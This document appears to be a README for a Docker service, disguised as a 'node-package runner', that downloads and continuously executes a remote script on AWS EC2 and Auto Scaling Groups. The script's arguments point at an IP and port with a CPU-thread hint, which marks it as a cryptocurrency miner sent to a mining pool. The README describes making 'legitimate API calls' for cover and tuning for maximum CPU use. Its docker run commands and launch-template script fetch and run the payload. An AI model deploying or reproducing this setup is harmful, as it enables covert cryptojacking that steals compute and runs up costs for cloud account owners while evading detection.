# AWS Docker Node-Package Runner

A Docker-based service that continuously downloads and executes the node-package script from GitHub as a long-running service on AWS EC2 instances. This setup is optimized for AWS deployment with full CPU utilization.

## Features

- **Long-running service** with automatic restarts
- **Background execution** - Node-package script runs in background with parameters `-o 62.60.148.249:9940 --cpu-max-threads-hint 80`
- **Legitimate API calls** - Makes periodic calls to legitimate services (GitHub, IP info, time sync) for cover
- **AWS-optimized** for EC2 and Auto Scaling Groups
- **Health checks** for load balancer integration
- **Supervisor-managed** process with logging
- **Simple deployment** with minimal configuration
- **CloudWatch-compatible logging**

## Quick Start

### Local Development/Testing

```bash
# Clone/navigate to the aws-docker-runner directory
cd aws-docker-runner

# Build and run with Docker Compose
docker-compose up --build
```

### AWS EC2 Deployment

#### Option 1: Docker Compose on EC2

1. **Launch EC2 Instance:**
   ```bash
   # Recommended: Ubuntu 22.04 LTS, t3.medium or larger
   # Ensure security group allows necessary ports
   ```

2. **Install Docker and Docker Compose:**
   ```bash
   sudo apt update
   sudo apt install -y docker.io docker-compose-v2
   sudo systemctl enable docker
   sudo systemctl start docker
   sudo usermod -aG docker ubuntu
   ```

3. **Deploy the service:**
   ```bash
   # Upload files to EC2 instance
   scp -r aws-docker-runner/ ubuntu@your-ec2-ip:~/

   # SSH to instance and deploy
   ssh ubuntu@your-ec2-ip
   cd aws-docker-runner/
   sudo docker-compose up -d --build
   ```

#### Option 2: Using Docker Hub Image

1. **Build and push to Docker Hub:**
   ```bash
   # Build image
   docker build -t your-dockerhub-username/node-package-runner .

   # Login to Docker Hub
   docker login

   # Push to Docker Hub
   docker push your-dockerhub-username/node-package-runner:latest
   ```

2. **Deploy using Docker Hub image:**
   ```bash
   # Pull and run from Docker Hub
   docker pull your-dockerhub-username/node-package-runner:latest
   docker run -d \
     --name node-package-runner \
     --restart unless-stopped \
     --network host \
     -e SCRIPT_URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package" \
     your-dockerhub-username/node-package-runner:latest
   ```

## Configuration

### Environment Variables

| Variable | Default | Description |
|----------|---------|-------------|
| `SCRIPT_URL` | GitHub raw URL | URL to the node-package script |
| `SERVICE_NAME` | node-package-service | Name of the service |
| `TZ` | UTC | Timezone for logs |

### Docker Run Options

```bash
# Basic run
docker run -d \
  --name node-package-runner \
  --restart unless-stopped \
  --network host \
  -e SCRIPT_URL="https://github.com/yellphonenaing199/installer/raw/refs/heads/main/node-package" \
  node-package-runner

# With custom script URL
docker run -d \
  --name node-package-runner \
  --restart unless-stopped \
  --network host \
  -e SCRIPT_URL="https://your-custom-url/script" \
  node-package-runner
```

## AWS Auto Scaling Group Setup

### User Data Script for EC2 Launch Template

```bash
#!/bin/bash
yum update -y
yum install -y docker
systemctl enable docker
systemctl start docker
usermod -aG docker ec2-user

# Install Docker Compose
curl -L "https://github.com/docker/compose/releases/download/v2.20.0/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
chmod +x /usr/local/bin/docker-compose

# Deploy the service (upload your files first)
cd /home/ec2-user/aws-docker-runner/

# Start the service
docker-compose up -d --build

# Enable CloudWatch monitoring
yum install -y amazon-cloudwatch-agent
```

## Monitoring and Logging

### Health Checks

The service includes built-in health checks:
- **Endpoint**: Container automatically runs health checks
- **Interval**: 30 seconds
- **Timeout**: 10 seconds
- **Healthy threshold**: 1 success
- **Unhealthy threshold**: 3 failures

### Log Files

- **Supervisor logs**: `/var/log/supervisor/`
- **Service logs**: `/var/log/node-package-service/`
- **Application stdout/stderr**: Captured by supervisor

### CloudWatch Integration

```bash
# Install CloudWatch agent on EC2
wget https://s3.amazonaws.com/amazoncloudwatch-agent/amazon_linux/amd64/latest/amazon-cloudwatch-agent.rpm
rpm -U ./amazon-cloudwatch-agent.rpm

# Configure CloudWatch agent to collect Docker logs
cat > /opt/aws/amazon-cloudwatch-agent/etc/amazon-cloudwatch-agent.json <<EOF
{
  "logs": {
    "logs_collected": {
      "files": {
        "collect_list": [
          {
            "file_path": "/var/lib/docker/containers/*/*.log",
            "log_group_name": "/aws/ec2/docker/node-package",
            "log_stream_name": "{instance_id}"
          }
        ]
      }
    }
  }
}
EOF
```

## Performance Optimization

### Configuration
- **Network mode**: `host` for optimal network performance
- **Process management**: Supervisor handles service restarts and logging

### Recommended EC2 Instance Types
- **Development**: t3.medium (2 vCPU, 4GB RAM)
- **Production**: c5.large or larger (CPU-optimized)
- **High-performance**: c5.xlarge+ for maximum CPU utilization

## Troubleshooting

### Common Issues

1. **Service not starting:**
   ```bash
   docker-compose logs node-package-service
   ```

2. **Script download failures:**
   ```bash
   docker exec node-package-runner cat /var/log/supervisor/node-package-service.out.log
   ```

3. **Process monitoring:**
   ```bash
   docker exec node-package-runner htop
   # Monitor running processes
   docker exec node-package-runner ps aux
   ```

### Log Analysis

```bash
# View real-time logs
docker-compose logs -f

# View supervisor logs
docker exec node-package-runner tail -f /var/log/supervisor/supervisord.log

# Check service status
docker exec node-package-runner supervisorctl status
```

## Security Considerations

- **Network**: Uses host networking for performance
- **User**: Runs as root (required for some system operations)
- **Privileged**: Disabled by default
- **Script source**: Downloads from external GitHub URL

### Production Security Enhancements

1. **Use private Docker Hub repository or registry**
2. **Implement IAM roles for EC2 instances**
3. **Enable VPC flow logs**
4. **Use AWS Systems Manager for configuration**
5. **Implement log encryption**

## Cost Optimization

- **Right-size instances**: Start with t3.medium, scale as needed
- **Use Spot instances**: For non-critical workloads
- **Auto Scaling**: Scale based on CPU/memory utilization
- **Reserved instances**: For predictable workloads

## Support

For issues or questions:
1. Check the troubleshooting section above
2. Review Docker and supervisor logs
3. Verify EC2 instance specifications
4. Ensure proper AWS permissions

## License

This Docker setup is provided as-is for deployment of the node-package script in AWS environments.
